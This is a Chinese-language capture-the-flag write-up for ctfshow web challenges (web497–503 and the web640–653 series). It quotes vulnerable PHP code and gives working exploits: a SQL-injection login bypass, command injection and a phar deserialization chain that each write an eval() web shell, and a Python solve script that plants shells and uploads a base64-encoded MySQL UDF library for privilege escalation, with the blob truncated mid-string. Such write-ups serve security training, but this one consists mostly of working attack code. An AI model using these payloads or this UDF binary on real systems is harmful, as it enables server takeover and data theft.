		if(!preg_match('/\:|\,/', $c)){
			$user=unserialize($c);
		}
		if($user){
			templateUtil::render('index');
		}else{
			header('location:index.php?action=login');
		}
	}else{
		header('location:index.php?action=login');
	}
	die();	
}

switch ($action) {
	case 'check':
		$username=$_POST['username'];
		$password=$_POST['password'];
		if(!preg_match('/file|or|innodb|sys|mysql/i', $username)){
			$sql = "select username,nickname,avatar from user where username = '".$username."' and password='".md5($password)."' order by id limit 1";
			$db=new db();
			$user=$db->select_one_array($sql);
		}
		if($user){
			$_SESSION['user']=$user;
			header('location:index.php?action=index');
		}else{
			templateUtil::render('error');
		}
		break;
	case 'clear':
		system('rm -rf cache/*');
		die('cache clear');
		break;
	case 'login':
		templateUtil::render($action);
		break;
	case 'index':
		$user=$_SESSION['user'];
		if($user){
			templateUtil::render('index',$user);
		}else{
			header('location:index.php?action=login');
		}
		break;
	case 'view':
		$user=$_SESSION['user'];
		if($user){
			templateUtil::render($_GET['page'],$user);
		}else{
			header('location:index.php?action=login');
		}
		break;
	case 'logout':
		session_destroy();
		header('location:index.php?action=login');
		break;
	default:
		templateUtil::render($action);
		break;
}
```

- 先登录管理员账号:



![image-20211015233228263](assets/2021-10-15-153228.png)



```none
?action=check
POST:
username=' || 1#&password=1
```

- 尝试修改头像

![image-20211015232902743](assets/2021-10-15-152903.png)

- 这个页面也可以看到`api/admin_edit.php`,读取源码

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-03-15 04:27:41
# @Last Modified by:   h1xa
# @Last Modified time: 2021-03-15 07:45:25
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
session_start();
include('../render/db_class.php');

error_reporting(0);
$user= $_SESSION['user'];
$ret = array(
		"code"=>0,
		"msg"=>"查询失败",
		"count"=>0,
		"data"=>array()
	);
if($user){
	extract($_POST);
	$user= $_SESSION['user'];
	if(preg_match('/\'|\"|\\\/', $avatar)){//过滤了单双引好和反斜线
		$ret['msg']='存在无效字符';
		die(json_encode($ret));
	}
	$sql = "update user set nickname='".substr($nickname, 0,8)."',avatar='".$avatar."' where username='".substr($user['username'],0,8)."'";//可以对$avatar进行覆盖
	$db=new db();
	if($db->update_one($sql)){
		$_SESSION['user']['nickname']=$nickname;
		$_SESSION['user']['avatar']=$avatar;
		$ret['msg']='管理员信息修改成功';
	}else{
		$ret['msg']='管理员信息修改失败';
	}
	die(json_encode($ret));

}else{
	$ret['msg']='请登录后使用此功能';
	die(json_encode($ret));
}
```

- 访问`api/admin_edit.php`，提交`avatar参数`修改为`flag文件`

![image-20211015233541676](assets/2021-10-15-153542.png)

- 确保修改成功之后，在管理后台右键检查



![image-20211015233632954](assets/2021-10-15-153633.png)

- base64解码:



![image-20211015233708151](assets/2021-10-15-153709.png)



## web498(SSRF打redis)

- 先登录上去,后台管理页面查看源代码



![image-20211017075409750](assets/2021-10-16-235410.png)

- 查看`api/index.php`代码
- 利用工具生成`gopher`请求，直接修改头像地址



![image-20211017141448112](assets/2021-10-17-061449.png)

**image-20211017141448112**



## web499

- 登陆进后台页面，尝试修改信息



![image-20211019085803823](assets/2021-10-19-005804.png)

- 查看`render/render_class.php`页面源代码

```php
public static function checkConfig($templateContent){
	$config = unserialize(file_get_contents(__DIR__.'/../config/settings.php'));
	foreach ($config as $key => $value) {
		if(stripos($templateContent, '{{config:'.$key.'}}')){
			$templateContent=str_replace('{{config:'.$key.'}}', $value, $templateContent);
		}
		
	}
	return $templateContent;
}
```

- 查看`config/settings.php`代码



![image-20211019090134216](assets/2021-10-19-010135.png)

**image-20211019090134216**



- 直接`rce`了

## web500(变量覆盖写马)

- 登陆进管理后台，发现有新的数据库管理界面，右键查看源代码

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-03-16 17:22:29
# @Last Modified by:   h1xa
# @Last Modified time: 2021-03-16 19:17:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
session_start();


error_reporting(0);
$user= $_SESSION['user'];
$ret = array(
		"code"=>0,
		"msg"=>"查询失败",
		"count"=>0,
		"data"=>array()
	);
if($user){
	extract($_POST);
	shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow > '.__DIR__.'/../backup/'.$db_path);


	if(file_exists(__DIR__.'/../backup/'.$db_path)){
		$ret['msg']='数据库备份成功';
	}else{
		$ret['msg']='数据库备份失败';
	}
	die(json_encode($ret));

}else{
	$ret['msg']='请登录后使用此功能';
	die(json_encode($ret));
}
```

- `$db_path`可控,`payload`

```php
post:
1;echo '<?php eval($_POST[1]);?>' > /var/www/html/1.php
```

- 访问`1.php`,进行`rce`

## Web501

没有什么新加入的模块，还是读取上一题数据库备份的文件

```php
<?php

session_start();
error_reporting(0);
$user= $_SESSION['user'];
$ret = array(
		"code"=>0,
		"msg"=>"查询失败",
		"count"=>0,
		"data"=>array()
	);
if($user){
	extract($_POST);

	if(preg_match('/^zip|tar|sql$/', $db_format)){
		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow > '.__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'.'.$db_format);
		if(file_exists(__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'.'.$db_format)){
			$ret['msg']='数据库备份成功';
		}else{
			$ret['msg']='数据库备份失败';
		}
	}else{
		$ret['msg']='数据库备份失败';
	}
	
	die(json_encode($ret));

}else{
	$ret['msg']='请登录后使用此功能';
	die(json_encode($ret));
}
```

加了一点限制，但是不影响命令注入

![image-20231122143307434](assets/image-20231122143307434.png)

## web502 

一样

## web503(phar反序列化)

先读取文件

```php
<?php
session_start();

include('../render/db_class.php');
error_reporting(0);
$user= $_SESSION['user'];
$pre=__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'/db.';
$ret = array(
		"code"=>0,
		"msg"=>"查询失败",
		"count"=>0,
		"data"=>array()
	);
if($user){
	extract($_POST);
	if(file_exists($pre.$db_format)){
			$ret['msg']='数据库备份成功';
			die(json_encode($ret));
	}

	if(preg_match('/^(zip|tar|sql)$/', $db_format)){
		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow > '.md5($pre.$db_format));
		if(file_exists($pre.$db_format)){
			$ret['msg']='数据库备份成功';
		}else{
			$ret['msg']='数据库备份失败';
		}
	}else{
		$ret['msg']='数据库备份失败';
	}
	die(json_encode($ret));

}else{
	$ret['msg']='请登录后使用此功能';
	die(json_encode($ret));
}
```

这里 MD5 包裹，确实没啥好办法利用了，又回头看写好的两个模块，发现配置这个地方多了一点东西

![image-20231122143538539](assets/image-20231122143538539.png)

果然也是发现了一个新的文件

![image-20231122143601868](assets/image-20231122143601868.png)

```php
<?php
session_start();
error_reporting(0);
$user= $_SESSION['user'];
$ret = array(
		"code"=>0,
		"msg"=>"查询失败",
		"count"=>0,
		"data"=>array()
	);
if($user){
	$arr = $_FILES["file"];
	if(($arr["type"]=="image/jpeg" || $arr["type"]=="image/png" ) && $arr["size"]<10241000 )
	{
		$arr["tmp_name"];
		$filename = md5($arr['name']);
		$ext = pathinfo($arr['name'],PATHINFO_EXTENSION);
		if(!preg_match('/^php$/i', $ext)){
			$basename = "../img/".$filename.'.' . $ext;
			move_uploaded_file($arr["tmp_name"],$basename);
			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
			$config['logo']=$filename.'.' . $ext;
			file_put_contents(__DIR__.'/../config/settings', serialize($config));
			$ret['msg']='文件上传成功';
		}
		
	}else{
		$ret['msg']='文件上传失败';
	}
	
	die(json_encode($ret));

}else{
	$ret['msg']='请登录后使用此功能';
	die(json_encode($ret));
}
```

这里可以文件上传，限制也不多，可以上传一个 phar 文件

通过这个 file_exists 触发到达反序列化的目的，通过下面的 dblog 来写马

```php
<?php 
class dbLog{
	public $sql;
	public $content="<?php eval(\$_POST[1]);?>";
	public $log="a.php";
}

$c=new dbLog();

$phar = new Phar("aaa.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");//设置stub，增加gif文件头
$phar->setMetadata($c); //将自定义meta-data存入manifest
$phar->addFromString("a", "a"); //添加要压缩的文件
$phar->stopBuffering();

?>
```

phar可以通过file_exits触发。
而且file_exits中的内容我们完全可控。
上传完phar之后访问/api/admin_db_backup.php
post内容(我上传的是aaa.phar所以里面的md5是aaa.phar的)
pre=phar:///var/www/html/img&db_format=/c54c75d1d14d4d656f5c33d25b3bfbaa.phar
接着访问a.php就可以了



# 0x11 终极考核

https://blog.csdn.net/miuzzx/article/details/119999827?spm=1001.2014.3001.5502

https://blog.csdn.net/miuzzx/article/details/121611585?spm=1001.2014.3001.5502

https://blog.csdn.net/miuzzx/article/details/121611613?spm=1001.2014.3001.5502

一键通关脚本

```python
import requests
import re
import time
import base64
import urllib

url="http://acfb991e-8e05-4683-9927-7b8778dea28e.challenge.ctf.show/"
sess=requests.session()
#web640
print(re.findall('flag.*?=ctfshow{.*?}',requests.get(url).text)[0])
#web641
print(sess.get(url).headers['Flag'])

#web642
print(re.findall('flag.*?=ctfshow{.*?}',sess.get(url+'system36d').text)[0])

#web643
sess.get(url+'system36d/checklogin.php?s=10')
print(urllib.parse.unquote(sess.get(url+'system36d/secret.txt').text))

#web644
print(re.findall('flag.*?=ctfshow{.*?}',sess.get(url+'system36d/static/js/lock/index.js').text)[0])

#web645
print(re.findall('flag.*?=ctfshow{.*?}',sess.get(url+'system36d/users.php?action=backup').text)[0])

#web646
print(re.findall('flag.*?=ctfshow{.*?}',sess.get(url+'system36d/users.php?action=remoteUpdate&auth=ctfshow{28b00f799c2e059bafaa1d6bda138d89}&update_address=init.php').text)[1])

#web647
print(re.findall('flag.*?=ctfshow{.*?}',sess.get(url+'system36d/users.php?action=evilString&m=session_id',headers={'Cookie':'PHPSESSID=372619038'}).text)[0])

#web648
print(re.findall('flag.*?=ctfshow{.*?}',sess.get(url+'system36d/users.php?action=evilClass&m=1&key=flag_647=ctfshow{e6ad8304cdb562971999b476d8922219}',headers={'Cookie':'PHPSESSID=372619038'}).text)[0])
#web649

u=url+"system36d/users.php?action=evilNumber&m=18&key=flag_648=ctfshow{af5b5e411813eafd8dc2311df30b394e}"
while True:
    r=requests.get(u)
    if "ctf" in r.text:
        print(r.text)
        break


#web650
print(sess.get(url+'system36d/users.php?action=evilFunction&m=session_id&key=flag_649=ctfshow{9ad80fcc305b58afbb3a0c2097ac40ef}',headers={'Cookie':'PHPSESSID=ffffffff'}).text)

#web651
'''
<?php
class a{
    public $username='123';
    public $x="ctfshow";
}
$a=new a();
echo serialize($a);
'''

print(sess.get(url+'system36d/users.php?action=evilArray&m=O:1:"a":2:{s:8:"username";s:3:"123";s:7:"ctfshow";s:7:"ctfshow";}&key=flag_650=ctfshow{5eae22d9973a16a0d37c9854504b3029}',headers={'Cookie':'PHPSESSID=ffffffff'}).text)

#web652
print(re.findall('flag.*?=ctfshow{.*?}',sess.get(url+'page.php?id=0) union select secret from ctfshow_secret%23').text)[0])


#模拟数据备份
files={'file':('1.dat',"<?php eval($_POST[1]);echo 123;?>","application/ms-tnef")} 

#生成木马
sess.post(url+"system36d/users.php?action=upload",files=files)
data1={"key":"key_is_here_you_know","file":"../db/data_you_never_know.db","1":"file_put_contents('a.php','<?php eval($_POST[1]);?>');"}
sess.post(url+'system36d/util/common.php?k=flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}',data=data1)

#web653
print(sess.post(url+"system36d/util/a.php",data={'1':'echo `cat /s*`;'}).text)
#写入木马
sess.post(url+"system36d/util/a.php",data={'1':'file_put_contents("/var/www/html/1.php","<?php eval(\$_POST[1]);?>");'})


#udf提权
data2={'1':'''`echo "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